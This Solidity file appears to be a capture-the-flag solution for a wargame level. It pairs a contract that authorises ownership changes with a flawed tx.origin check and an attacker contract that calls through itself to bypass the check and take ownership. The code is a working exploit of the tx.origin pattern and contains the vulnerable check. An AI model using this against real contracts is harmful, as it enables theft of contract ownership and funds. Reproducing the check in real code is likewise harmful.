// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneIsMine {
    Telephone private telephone;
    constructor(address _problemAddress) {
        telephone = Telephone(_problemAddress);
    }

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
